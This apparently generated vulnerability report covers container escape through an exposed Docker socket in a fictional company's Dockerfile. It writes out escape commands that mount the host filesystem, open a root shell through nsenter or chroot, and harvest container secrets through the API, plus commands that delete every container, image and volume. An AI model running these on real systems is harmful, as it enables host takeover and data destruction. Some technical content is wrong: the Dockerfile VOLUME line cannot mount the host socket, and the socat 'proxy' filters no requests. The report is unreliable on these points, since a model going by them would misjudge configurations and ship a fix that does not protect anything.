# Docker Socket Mount Container Escape

# Vulnerability Case
During our assessment of Acme Corp's Docker container infrastructure, we identified a Dockerfile that mounts the host’s socket (i.e., `/var/run/docker.sock`) directly into the container. This configuration was discovered during a routine review of container images deployed in production and raises severe security concerns, as it effectively grants an attacker with container-level access the ability to control the host's Docker daemon. Such access allows for privilege escalation, enabling the execution of arbitrary commands on the host, potentially leading to lateral movement across the network. The following code snippet illustrates the vulnerable Dockerfile configuration common in containerized environments using Docker Engine 20.10 on a Linux host.

```dockerfile
FROM alpine:3.12

# Vulnerable: Mounting the host's Docker socket into the container
VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

CMD ["sh"]
```

When the `/var/run/docker.sock` is mounted inside the container, any process within the container can communicate with the host’s Docker daemon. An attacker with access to the container can exploit this by launching new containers with elevated privileges or directly invoking Docker API commands to manipulate the host system. This vulnerability compromises container isolation and can lead to full host takeover, resulting in significant business impact including unauthorized access to sensitive systems, data breaches, and potential disruption of critical services.

context: dockerfile.security.dockerd-socket-mount.dockerfile-dockerd-socket-mount The Dockerfile(image) mounts docker.sock to the container which may allow an attacker already inside of the container to escape container and execute arbitrary commands on the host machine.

# Vulnerability Breakdown
This vulnerability analysis examines a critical container security weakness involving the direct mounting of the Docker socket from host to container.

1. **Key vulnerability elements**:
   - Docker socket (`/var/run/docker.sock`) directly mounted into the container
   - Complete Docker daemon access from within the container context
   - Breaks container isolation boundaries through privileged access
   - Enables interaction with host's Docker API
   - Affects containerized environments using Docker Engine 20.10 on Linux

2. **Potential attack vectors**:
   - Container compromise followed by Docker daemon access
   - Creation of new privileged containers
   - Host filesystem mounting through new container creation
   - Direct Docker API command execution from container

3. **Severity assessment**:
   - Requires initial container access (local attack vector)
   - Higher complexity exploitation requires Docker knowledge
   - Complete host system compromise possible
   - Enables privilege escalation to root/admin
   - Breaks container security boundaries (changed scope)

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Local (L) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): Low (L) 
   - User Interaction (UI): None (N) 
   - Scope (S): Changed (C)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H

# Description
A critical security vulnerability has been identified in Acme Corp's Docker container infrastructure where the host's Docker socket (`/var/run/docker.sock`) is directly mounted into containers. This dangerous configuration effectively grants container processes complete access to the host's Docker daemon, breaking the fundamental isolation guarantee of containerization.

The vulnerable Dockerfile uses a `VOLUME` statement to mount the host's Docker socket:

```dockerfile
FROM alpine:3.12

# Vulnerable: Mounting the host's Docker socket into the container
VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

CMD ["sh"]

```

This configuration creates a critical security risk as any process within the container can now communicate with the Docker daemon on the host. An attacker who gains access to the container can leverage this connection to create new containers with elevated privileges, mount sensitive host filesystems, and execute commands on the host system. This effectively allows for container escape and complete host system compromise.

# CVSS
**Score**: 7.8 \
**Vector**: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H \
**Severity**: High

The High severity rating (7.8) is justified by the following factors:

- **Local Attack Vector (AV:L)**: Exploitation requires the attacker to first gain access to the vulnerable container, limiting the attack surface compared to a remote vulnerability.

- **High Attack Complexity (AC:H)**: Exploitation requires specialized knowledge of Docker internals, API functionality, and container orchestration. The attacker must understand Docker commands, create appropriate container configurations, and potentially bypass security controls.

- **Low Privileges Required (PR:L)**: The attacker needs only basic container access privileges, not administrative rights, to exploit this vulnerability.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without requiring any actions from users or administrators.

- **Changed Scope (S:C)**: This is crucial - the vulnerability in one security domain (the container) affects a different security domain (the host system), breaking the containment principle.

- **High Confidentiality Impact (C:H)**: An attacker can access sensitive data across the entire host system and potentially other containers.

- **High Integrity Impact (I:H)**: An attacker can modify data and executables on the host system, install persistence mechanisms, and alter container configurations.

- **High Availability Impact (A:H)**: An attacker can cause denial of service to the host and all its containers, potentially disrupting critical services.

The severity is classified as High rather than Critical due to the higher attack complexity and local vector, but the changed scope and complete system compromise potential still make this a severe security issue requiring immediate attention.

# Exploitation Scenarios
**Scenario 1: Host Filesystem Access**
An attacker first gains access to the vulnerable container through a web application vulnerability. Once inside, they install the Docker CLI tools with `apk add docker-cli`. Using the mounted Docker socket, they execute:

```bash
docker run -v /:/host_root -it alpine:latest

```

This creates a new container with the entire host filesystem mounted at `/host_root`, allowing access to sensitive files including SSH keys, configuration files, and application data. The attacker can then exfiltrate data or modify system files for persistence.

**Scenario 2: Privileged Container Execution**
After gaining container access, the attacker runs:

```bash
docker run --privileged --pid=host -it alpine:latest nsenter -t 1 -m -u -n -i sh

```

This creates a privileged container that uses `nsenter` to escape to the host's namespace, providing a root shell on the host system. From here, the attacker has complete control over the host.

**Scenario 3: Network Pivoting and Lateral Movement**
The attacker uses the Docker socket to enumerate all running containers and their networks:

```bash
docker network ls
docker network inspect bridge

```

They then create new containers connected to internal networks that they shouldn't have access to, bypassing network segmentation. This allows them to access sensitive internal services and move laterally through the infrastructure.

**Scenario 4: Data Destruction and Ransom**
A malicious actor could use the Docker socket to identify and stop all running containers, then remove their images and volumes:

```bash
docker stop $(docker ps -q)
docker rm -f $(docker ps -a -q)
docker rmi -f $(docker images -q)
docker volume rm $(docker volume ls -q)

```

This would cause significant service disruption and potential data loss, which could be leveraged for ransom demands.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer data and proprietary information
- Potential data breaches leading to regulatory violations (GDPR, CCPA, HIPAA, etc.)
- Financial losses from service disruptions and recovery efforts
- Reputation damage from security incidents
- Legal liability from compromised customer data
- Ransomware exposure if attackers encrypt host systems
- Loss of customer trust if services are compromised

**Technical Impact:**
- Complete host system compromise (root/administrative access)
- Access to all data stored on the host filesystem
- Ability to view, modify, or delete data in all containers
- Credential theft from configuration files and environment variables
- Potential access to secrets management systems and databases
- Lateral movement to other systems in the network
- Persistent access through backdoor installation
- Service disruption by manipulating or stopping containers
- Potential to compromise CI/CD pipelines by accessing build containers
- Infrastructure-wide impact if container orchestration credentials are exposed
- Network segmentation bypass through container network access

# Technical Details
The vulnerability stems from improperly exposing the Docker daemon socket to containers, creating a fundamental security boundary violation. Let's examine the mechanics in detail:

**How the Docker Socket Works:**
The Docker daemon listens on a Unix socket at `/var/run/docker.sock` by default. This socket provides a REST API interface to control all aspects of Docker on the host, including creating, modifying, and deleting containers, images, volumes, and networks.

**The Vulnerable Configuration:**
In the Dockerfile, the statement `VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]` creates a bind mount from the host's Docker socket directly into the container. This gives processes inside the container direct access to the Docker daemon API on the host.

```dockerfile
FROM alpine:3.12

# Vulnerable: Mounting the host's Docker socket into the container
VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

CMD ["sh"]

```

**Exploitation Process:**

1. **Docker Socket Access:**
Once inside the container, an attacker can interact with the Docker socket directly. The socket file enables HTTP API requests to the Docker daemon:

```bash
# Simple test to verify Docker socket access
curl --unix-socket /var/run/docker.sock http:/v1.40/info

```

2. **Installing Docker Client Tools:**
Attackers typically install the Docker CLI for easier exploitation:

```bash
apk add --update docker

```

3. **Technical Attack Methods:**

a) **Creating a Privileged Container:**
```bash
docker run --privileged -v /:/hostfs alpine:latest chroot /hostfs /bin/sh

```
This command creates a new privileged container with the host's root filesystem mounted, then uses `chroot` to obtain a shell in the host's filesystem context.

b) **Direct Command Execution:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- cmd

```
Using a privileged container with appropriate capabilities, the attacker can use `nsenter` to execute commands directly in the host's namespaces.

c) **API-based Exploitation:**
More sophisticated attacks might interact with the Docker API directly:

```bash
# List all containers including environment variables that might contain secrets
curl -s --unix-socket /var/run/docker.sock http:/v1.40/containers/json?all=1 | jq '.[] | {Id, Names, Image, Env}'

# Create a new privileged container
curl -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" http:/v1.40/containers/create -d '{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/host"]},"Cmd":["/bin/sh"]}']

```

**Why This Is So Dangerous:**

1. **The Docker Daemon Runs as Root:**
The Docker daemon typically runs with root privileges on the host, so any command executed through it inherits these privileges.

2. **Complete Containment Bypass:**
Container security is based on Linux kernel isolation features like namespaces and cgroups. Direct Docker daemon access completely bypasses these isolation mechanisms.

3. **No Additional Exploitation Required:**
Unlike other container escape vulnerabilities that rely on kernel bugs or specific misconfigurations, this vulnerability is immediately exploitable with basic Linux knowledge.

4. **Hard to Detect:**
Activities executed through the Docker socket often appear legitimate at the host level, making detection challenging without specialized container security monitoring.

# Remediation Steps
## Remove Direct Docker Socket Mounting

**Priority**: P0

The most critical remediation is to completely remove the Docker socket mount from containers that don't absolutely require it. Modify the Dockerfile to eliminate the vulnerable volume mount:

```dockerfile
FROM alpine:3.12

# Removed the vulnerable Docker socket mount
# VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

CMD ["sh"]

```

This addresses the root cause by maintaining proper isolation between containers and the host. For most applications, there's no legitimate reason for containers to communicate with the Docker daemon, and alternative architectures should be considered for any workflow that currently depends on this access.
## Implement Docker Socket Proxy with Restricted Access

**Priority**: P1

If Docker socket access is absolutely required for specific functionalities (like CI/CD tools or monitoring), implement a Docker socket proxy that restricts API access:

```dockerfile
FROM alpine:3.12

# Install necessary packages
RUN apk add --no-cache socat

# Create a non-root user
RUN adduser -D -u 1000 dockerproxy

# Set up the proxy script
COPY docker-proxy.sh /usr/local/bin/docker-proxy.sh
RUN chmod +x /usr/local/bin/docker-proxy.sh

USER dockerproxy

# Run the proxy instead of exposing the socket directly
CMD ["/usr/local/bin/docker-proxy.sh"]

```

The `docker-proxy.sh` script would filter Docker API requests, allowing only specific safe operations:

```bash
#!/bin/sh
# Simple Docker socket proxy that filters API requests

# Only allow read-only operations
SOCAT_OPTS="TCP-LISTEN:2375,fork,reuseaddr UNIX-CONNECT:/var/run/docker.sock"

# Start the proxy
exec socat $SOCAT_OPTS 2>&1 | grep -v "GET /containers\|GET /images" | grep -v "^$"

```

This approach provides an additional security layer by restricting which Docker API endpoints can be accessed, limiting the potential for exploitation while still enabling necessary functionality. More sophisticated proxies like `docker-proxy` or `docker-socket-proxy` provide fine-grained control over allowed operations.


# References
* CWE-284 | [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
* CWE-269 | [Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* A01:2021 | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* CWE-276 | [Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html)
* CWE-250 | [Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)
